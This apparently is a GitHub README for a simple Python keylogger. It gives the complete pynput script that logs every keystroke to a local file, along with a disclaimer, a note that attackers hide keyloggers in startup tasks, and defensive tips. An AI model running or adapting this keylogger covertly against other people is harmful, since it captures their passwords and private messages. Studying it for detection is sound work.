# Python-Keylogger
This is a simple Python script that logs keyboard activity using the `pynput` library. It records keystrokes and writes them to a local text file (`keyfile.txt`). This tool is designed **solely for educational and ethical testing purposes**, such as understanding how keyloggers work and how to detect or prevent them.

DISCLAIMER

> **This project is intended strictly for educational use.**  
> Do **not** use this software on any system without **explicit written permission** from the owner.

 How It Works
- Listens to all keyboard input using the `pynput.keyboard` module.
- Logs printable characters to `keyfile.txt`.
- Records special keys like `Enter`, `Tab`, `Shift` as `[Key.enter]`, `[Key.shift]`, etc.
- Stops recording when the **Escape** key is pressed.

from pynput import keyboard 

from pynput import keyboard 


def key_pressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logkey:
        try:
            logkey.write(key.char)
        except AttributeError:
            logkey.write(f'[{key}]')

def on_release(key):
    # Stop listener if Esc is pressed
    if key == keyboard.Key.esc:
        return False

if __name__ == "__main__":
    with keyboard.Listener(on_press=key_pressed, on_release=on_release) as listener:
        listener.join()

#What makes keyloggers so dangerous
Keyloggers are majority of the time are hidden and passivly logging scripts, many attackers abuse this by implemting them into system startup and automated stricts. Usally through TaskSchedular.

 
 #How to Protect Against Keyloggers#
-Use up-to-date antivirus/anti-malware software
-Regularly audit running processes
-Monitor for unusual file changes 
-Educate users on suspicious behavior and phishing


#This script is useful for:
Learning how keyloggers operate
Understanding attack vectors in endpoint security
Practicing defensive detection and mitigation techniques



